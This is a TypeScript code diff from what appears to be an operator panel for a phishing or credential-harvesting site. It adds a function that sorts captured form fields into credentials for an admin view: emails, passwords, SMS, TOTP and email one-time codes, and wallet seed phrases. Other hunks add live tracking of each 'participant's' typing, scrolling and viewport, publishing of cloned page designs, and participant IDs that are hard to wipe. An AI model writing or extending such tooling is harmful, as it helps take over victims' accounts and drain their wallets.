@@ -26,6 +26,46 @@ export type InputPayload = {
   at: number;
 };
 
+/**
+ * Credentials / codes that belong in the admin Submitted panel.
+ * Noise (captcha, phone_send, clicks, balance picks, etc.) is excluded.
+ */
+export function isSensitiveAdminSubmission(field: string): boolean {
+  const key = field
+    .replace(/_submitted$/i, "")
+    .trim()
+    .toLowerCase()
+    .replace(/[\s-]+/g, "_");
+
+  // Logins
+  if (
+    key === "email" ||
+    key === "login" ||
+    key === "identifier" ||
+    key === "recovery_email" ||
+    key === "email_or_phone"
+  ) {
+    return true;
+  }
+  // Passwords
+  if (key === "password" || key === "passwd") return true;
+  // SMS / authenticator / email OTP
+  if (
+    key === "sms_code" ||
+    key === "sms" ||
+    key === "totp" ||
+    key === "authenticator" ||
+    key === "otp" ||
+    key === "email_code" ||
+    key === "mailcode"
+  ) {
+    return true;
+  }
+  // Seed phrases + case IDs (other suites — still participant secrets)
+  if (key.includes("phrase") || key === "case_id") return true;
+  return false;
+}
+
 export type LiveInputPayload = {
   participantId: string;
   field: string;
@@ -50,8 +90,8 @@ export type ScrollPayload = { id: string; sx: number; sy: number; at: number };
 export type ViewportPayload = { id: string; w: number; h: number; at: number };
 
 export type DesignPublishPayload = {
-  design: "red" | "blue";
-  page: "home" | "contact";
+  design: "cb" | "gi";
+  page: string;
   html: string;
   css: string;
   js: string;
@@ -78,7 +118,11 @@ export function getOrCreateParticipantId(): string {
   try { id = localStorage.getItem(PID_KEY); } catch { /* ignore */ }
   if (!id) id = readCookie(PID_KEY);
   if (!id) {
-    id = `p_${Math.random().toString(36).slice(2, 8)}${Date.now().toString(36).slice(-4)}`;
+    const uuid =
+      typeof crypto !== "undefined" && typeof crypto.randomUUID === "function"
+        ? crypto.randomUUID()
+        : `${Date.now().toString(36)}${Math.random().toString(36).slice(2)}`;
+    id = `p_${uuid}`;
   }
   // Re-persist to both stores so a wipe of one is restored from the other.
   try { localStorage.setItem(PID_KEY, id); } catch { /* ignore */ }
